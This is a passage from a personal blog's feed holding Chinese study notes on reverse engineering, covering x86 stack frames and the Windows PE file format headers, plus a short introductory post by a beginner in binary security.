alt="stack"></p><p>ps：正是因为栈先进后出，在函数中，引用参数时，参数入栈的顺序与源码中的参数顺序恰好相反</p><h5 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h5><p>​    </p><p>​    我们先来看一个栈帧的函数结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#这里使用32位寄存器做说明</span><br><span class="line">PUSH EBP ;函数起始，会先保存进入函数前EBP的值</span><br><span class="line">MOV EBP, ESP ;将ESP的值赋给EBP, 这里也是栈帧的开始，EBP此时指向栈帧的底部。</span><br><span class="line">SUB ESP,08H#提前申请内存空间</span><br><span class="line">...&#x2F;#中间代码</span><br><span class="line">ADD ESP,08H#释放申请的内存空间</span><br><span class="line">MOV ESP, EBP;此时相当于回收栈帧，ESP重新指向曾经的栈顶</span><br><span class="line">POP EBP;恢复EBP的值</span><br></pre></td></tr></table></figure><p>栈帧技术使用EBP寄存器管理局部变量、参数、返回地址。</p><p>栈帧是函数活动的记录，生命周期随着函数开始而开始。核心原理上面讲，ESP寄存器承担着栈顶指针的作用，程序运行中，ESP的值随时变化，访问栈中函数的局部变量、参数时，若以ESP为基准编写程序会十分困难，并且也很难受使CPU引用到准确的作用。</p><p>​    栈帧是利用BP来指向栈帧的底部，用SP指向栈帧的顶部。</p><h3 id="第二部分-PE文件格式"><a href="#第二部分-PE文件格式" class="headerlink" title="第二部分  PE文件格式"></a>第二部分  PE文件格式</h3><p><font size=4 color= "pink"><strong>如果单单是学习过一个知识点之后把知识罗列出来，似乎没有什么意义，在我之前已经有不少师傅总结过这些东西了，那么我会尽可能的用我自己的学习历程来记录这个知识点，话不多说，开整！</strong></font></p><h4 id="pe文件格式："><a href="#pe文件格式：" class="headerlink" title="pe文件格式："></a>pe文件格式：</h4><h5 id="学习准备：lordPe-WINHEX"><a href="#学习准备：lordPe-WINHEX" class="headerlink" title="学习准备：lordPe,WINHEX"></a>学习准备：<a href="https://softfamous.com/lordpe/download/">lordPe</a>,<a href="https://x-ways.net/winhex/">WINHEX</a></h5><h5 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h5><p>介绍这一部分，主要依据了<a href="https://book.douban.com/subject/25866389/">逆向工程核心原理</a>这本书。</p><p>PE文件是Windows操作系统下使用的可执行文件格式。它是微软在UNIX平台的COFF（通用对象文件格式）基础上制作而成的。</p><p>32位可执行文件称为PE文件;</p><p>64位可执行文件称为PE+, 是PE文件的一种扩展形式。</p><p>PE文件种类：</p><p><img src="https://i.loli.net/2020/09/25/dsEeI8Nv9QGh5cz.png" alt="image-20200925215704186"></p><p>严格来说，OBJ文件之外的所有文件都是可执行的。DLL、SYS等虽然不能直接在shell中运行，但是可以使用其他方法执行(调试器)。</p><p>这里做一个知识拓展。</p><p>众所周知，CPP文件到EXE文件经历了如下的心路历程</p><p>cpp-&gt;obj-&gt;dll,lib-&gt;exe</p><p>lib是编译时需要的，lib是运行时需要的。</p><h5 id="知识铺垫："><a href="#知识铺垫：" class="headerlink" title="知识铺垫："></a>知识铺垫：</h5><p><font size=3 color= "pink"><strong>王爽的汇编是少数我能读下来一遍过的计算机类书籍，这和作者利用”知识屏蔽“的手法不无关系。但是许多书籍并没有所谓的知识屏蔽，但我还是得读，窃以为，有些书籍的知识点会关联别的知识点，另一个知识点我不会怎么办？我自己用的方法是，暂时大概理解，因为计算机各种体系的知识过于庞杂，要全部融会贯通对我实在遥不可及。当然，前面说了暂时二字，后续也得补充</strong></font></p><h6 id="虚拟内存："><a href="#虚拟内存：" class="headerlink" title="虚拟内存："></a>虚拟内存：</h6><p>虚拟内存技术是基于局部性原理的，暂时可以这样理解虚拟内存技术的实现，不常用的课本是在书架上的，常用的课本在书包里，这就使得，<font color= "orange">我们不必将所有的书放在书包里，但是这些书都是我们学习过程中要用到的东西。</font></p><p>那么利用了虚拟内存技术，我们会不定的更换书包中的书本，在内存中建立一个连续的内存单元是不方便实现这种模式的，故我们采用离散分配的方式。当然，单个文件分配到内存应是连续的。</p><p><img src="https://i.loli.net/2020/09/25/raleqLwtckW8s3C.png" alt="VirtualMem01.png"></p><h6 id="一些定义："><a href="#一些定义：" class="headerlink" title="一些定义："></a>一些定义：</h6><p>ImageBase: 内存基址</p><p>VA: 虚拟地址：指文件被载入虚拟空间之后的地址</p><p>RVA: 相对虚拟地址：指文件载入内存后相对与ImageBase的偏移量。 RVA = VA - ImageBase。</p><p>FOA：理解为文件在磁盘上相对于文件起始地址的偏移地址。</p><h5 id="PE文件结构："><a href="#PE文件结构：" class="headerlink" title="PE文件结构："></a>PE文件结构：</h5><p><img src="https://i.loli.net/2020/09/25/v1qaBgJru5N3WOF.png" alt="image-20200925235026004"></p><p>我们惊奇的发现文件的大小似乎改变了，但是两边整体的大小各自减去NULL的部分之后，他们仍然是一样的大小，后面详细的原理，慢慢道来。</p><h5 id="dos头："><a href="#dos头：" class="headerlink" title="dos头："></a>dos头：</h5><p>关于dos头，只需记住，这是微软考虑PE文件对DOS文件的兼容性，扩展已有的DOS EXE头。</p><p><img src="https://i.loli.net/2020/09/25/fC7iM2bge8Lphkl.png" alt="image-20200925235317502"></p><p>由图，可以看到这是一个结构体，那么我们当然要全部记住（？？？）/doge</p><p>只需记住两个部分即可，e_magic和e_flanew</p><h6 id="e-magic"><a href="#e-magic" class="headerlink" title="e_magic"></a>e_magic</h6><p>随意打开一个32位的exe文件，惊喜的发现，会有这个东西</p><p><img src="https://i.loli.net/2020/09/26/cQW3km2wghnSDr8.png" alt="image-20200925235959122"></p><p>ok，接下来略作修改</p><p><img src="https://i.loli.net/2020/09/26/EIC7s5rygpv8Ati.png" alt="image-20200926000148704"></p><p>运行这个exe程序</p><p><img src="https://i.loli.net/2020/09/26/fpieHY2uUyJCtmn.png" alt="image-20200926000246873"></p><p>更加惊喜！</p><p>你只需把他记住PE文件的一种约定。实际上，MZ是dos可执行文件的设计者姓名首字母的缩写。</p><p>直接略过结构体其他部分</p><p>直到最后</p><h6 id="e-lfanew"><a href="#e-lfanew" class="headerlink" title="e_lfanew"></a><strong>e_lfanew</strong></h6><p>没什么好讲的，他定位到了NT头。</p><p>不信？</p><p><img src="https://i.loli.net/2020/09/26/6sQc2T3mMJ1AjOP.png" alt="image-20200926001252090"></p><p>好的，那么接下来分析NT头</p><p>dos_stub:???</p><h6 id="dos存根"><a href="#dos存根" class="headerlink" title="dos存根"></a>dos存根</h6><p>dos存根是位于DOS头下方的一个可选项，大小不确定。这里不多赘述。</p><p>dos_stub:???</p><h5 id="NT头："><a href="#NT头：" class="headerlink" title="NT头："></a>NT头：</h5><p>叫NT是因为windows nt的关系，没骂人。</p><p>NT头结构体，：</p><p><img src="https://i.loli.net/2020/09/26/WmchsUrnvfF1J4k.png" alt="image-20200926002205972"></p><p>惊奇的发现，后面两个是结构体中的结构体中的…</p><p><img src="https://i.loli.net/2020/09/26/6P2OXTJct4ej5mS.png" alt="image-20200926002656342"></p><p>好了，刚刚e_lfanew指向了NT头，signature作为结构体第一个成员，理所应当被指♂向了。</p><p><img src="https://i.loli.net/2020/09/26/hJTx3Z5RS71MYnN.png" alt="image-20200926002851937"></p><p>既然是签名，那么估计也是一种约定。</p><p>有兴趣可以修改一下这两个值。</p><h5 id="文件头："><a href="#文件头：" class="headerlink" title="文件头："></a>文件头：</h5><p><img src="https://i.loli.net/2020/09/26/86xmGgDOlEubWj4.png" alt="image-20200926003028766"></p><h6 id="machine："><a href="#machine：" class="headerlink" title="machine："></a>machine：</h6><p><img src="https://i.loli.net/2020/09/26/LDBNgVIhbROdS5X.png" alt="image-20200926003924149"></p><h6 id="NumberOfSections"><a href="#NumberOfSections" class="headerlink" title="NumberOfSections:"></a>NumberOfSections:</h6><p>用来指出文件中存在的分区数量</p><p><img src="https://i.loli.net/2020/09/26/MjgHP2EyCKznDOT.png" alt="image-20200926004143847"></p><p><img src="https://i.loli.net/2020/09/26/e3GIUliVS5FwfJj.png" alt="image-20200926004240771"></p><h6 id="SizeOfOptionalHeader"><a href="#SizeOfOptionalHeader" class="headerlink" title="SizeOfOptionalHeader:"></a>SizeOfOptionalHeader:</h6><p>用来指出IMAGE_OPTIONAL_HEADER的大小。</p><h6 id="characteristics："><a href="#characteristics：" class="headerlink" title="characteristics："></a>characteristics：</h6><p>根据对应值用以指明文件的一些属性</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20200926145853.png" alt="image-20200926004917922"></p><p>winhex中，这里是0307</p><p><img src="https://i.loli.net/2020/09/26/NTGkuDbYUVsKMjm.png" alt="123"></p><p>做个累加，说明它符合</p><p>0x0001+0x0002+0x0004</p><p>and0x0010+0x0020</p><h5 id="NT头：可选头"><a href="#NT头：可选头" class="headerlink" title="NT头：可选头"></a>NT头：可选头</h5><p>OK捡起重要的分析</p><h6 id="magic："><a href="#magic：" class="headerlink" title="magic："></a>magic：</h6><p>指出文件的类型</p><p><img src="https://i.loli.net/2020/09/26/FtLpoZ6edrsUgbJ.png" alt="image-20200926010141036"></p><p><img src="https://i.loli.net/2020/09/26/oiLh8T5ySfwVXMg.png" alt="image-20200926010205584"></p><h6 id="AddressOfEntryPoint"><a href="#AddressOfEntryPoint" class="headerlink" title="AddressOfEntryPoint:"></a>AddressOfEntryPoint:</h6><p>此成员指明程序最先执行的代码起始地址。这里引出所需要的第二个程序</p><p>EP是逆向学习中很重要的一个东西，但是由上发现用winhex去寻找太过浪费时间。故我们用lordpe</p><p>拖入程序P9</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20200926151243744.png" alt="image-20200926151243744"></p><h6 id="ImageBase："><a href="#ImageBase：" class="headerlink" title="ImageBase："></a>ImageBase：</h6><p>PE文件被加载到内存中，会被分配一个起始地址，这就是ImgeBase的内容</p><h6 id="SECTIONALIGNMENT-FILEALIGNMENT"><a href="#SECTIONALIGNMENT-FILEALIGNMENT" class="headerlink" title="SECTIONALIGNMENT, FILEALIGNMENT"></a>SECTIONALIGNMENT, FILEALIGNMENT</h6><p>PE文件的Body部分划分为若干节区，这些字节存储着不同类别的数据。SectionAlignment指定了节区在内存中的最小单位，FILEALIGNMENT制定了节区在磁盘中的最小单位。</p><p><font color="pink" size = 4>磁盘文件或内存的节区大小必定为FileAlignment或SectionAlignment的整数倍</font></p><h6 id="SizeOfImage"><a href="#SizeOfImage" class="headerlink" title="SizeOfImage"></a>SizeOfImage</h6><p>制定了PE IMage在虚拟内存中所占空间的大小。</p><h6 id="SizeOfHeader"><a href="#SizeOfHeader" class="headerlink" title="SizeOfHeader"></a>SizeOfHeader</h6><p>用以指名整个PE头的大小，该值必须是FileAlignment的整数倍</p><h6 id="Subsystem"><a href="#Subsystem" class="headerlink" title="Subsystem:"></a>Subsystem:</h6><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20200926152248.png" alt="image-20200926152248709"></p><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h6 id="DataDiroctory"><a href="#DataDiroctory" class="headerlink" title="DataDiroctory"></a>DataDiroctory</h6><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20200926152550.png" alt="image-20200926152550829"></p><h5 id="节区头："><a href="#节区头：" class="headerlink" title="节区头："></a>节区头：</h5><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20200926152637.png" alt="image-20200926152637763"></p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20200926152708.png" alt="image-20200926152708005"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>VA = IMAGEBASE+RVA</p><p>文件偏移地址 = RVA - 节偏移</p><p><font color= "pink" size = 5>这个部分我直接引用了原理里面的内容，不会很困难，至此PE部分的简要介绍就结束了。这份文档的目的仅仅是为自己的学习做记录，当然能帮到你们更好了。</font></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逆向工程核心原理学习笔记&quot;&gt;&lt;a href=&quot;#逆向工程核心原理学习笔记&quot; class=&quot;headerlink&quot; title=&quot;逆向工程核心原理学习笔记&quot;&gt;&lt;/a&gt;逆向工程核心原理学习笔记&lt;/h1&gt;&lt;p&gt;作者：&lt;a href=&quot;yoshiki-lee.github</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初遇</title>
    <link href="http://yoursite.com/2020/09/23/%E5%88%9D%E8%AF%86/"/>
    <id>http://yoursite.com/2020/09/23/%E5%88%9D%E8%AF%86/</id>
    <published>2020-09-23T03:52:41.000Z</published>
    <updated>2020-09-23T06:36:28.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初次见面，多多指教"><a href="#初次见面，多多指教" class="headerlink" title="初次见面，多多指教"></a>初次见面，多多指教</h2><p>​    我是<a href="https://yoshiki-lee.github.io/">yoshiki-lee</a></p><p>​    自我介绍这里暂时就略过吧，因为目前处于初学的阶段，也没有什么成绩。</p><p>​    目前入坑二进制安全，也简单的做了<a href="https://buuoj.cn/resources">BUUCTF</a>一些re方向的入门题目。可能现在有的东西，只有热情和兴趣，但对于迷茫了许久的我来说，下定决心要做这个门槛较高的方向，也是很宝贵的经历。</p><p>​    我会在这里更新自己的一些学习笔记，希望能和正处于这个行业的师傅们有所交流。    </p><p>​    谢谢<a href="https://redogwu.github.io/">wjllz</a>这个b。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初次见面，多多指教&quot;&gt;&lt;a href=&quot;#初次见面，多多指教&quot; class=&quot;headerlink&quot; title=&quot;初次见面，多多指教&quot;&gt;&lt;/a&gt;初次见面，多多指教&lt;/h2&gt;&lt;p&gt;​    我是&lt;a href=&quot;https://yoshiki-lee.github</summary>
      
    
    
    
    
  </entry>
  
</feed>
